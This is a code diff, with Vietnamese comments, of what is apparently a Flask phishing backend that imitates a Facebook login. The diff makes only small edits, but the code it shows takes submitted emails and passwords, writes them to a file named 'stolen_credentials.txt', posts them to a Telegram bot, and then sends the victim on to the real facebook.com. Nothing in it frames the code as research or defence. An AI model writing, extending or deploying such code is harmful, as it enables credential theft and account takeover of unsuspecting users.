@@ -21,13 +21,14 @@ def send_to_telegram(email, password):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         requests.post(url, data={
-            "chat_id": TELEGRAM_CHAT_ID, 
-            "text": message, 
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
             "parse_mode": "Markdown"
         })
         print(f"✅ Đã gửi Telegram: {email}")
     except Exception as e:
         print(f"❌ Lỗi gửi Telegram: {e}")
+
 # ====================================================
 
 @app.route('/')
@@ -39,11 +40,14 @@ def login():
     email = request.form.get('email')
     password = request.form.get('pass')
     
+    # Lưu vào file
     with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
         f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
     
+    # Gửi về Telegram
     send_to_telegram(email, password)
     
+    # Chuyển hướng
     resp = make_response(redirect('https://www.facebook.com'))
     resp.set_cookie('session_id', 'hijackable_' + os.urandom(8).hex(), httponly=True)
     return resp
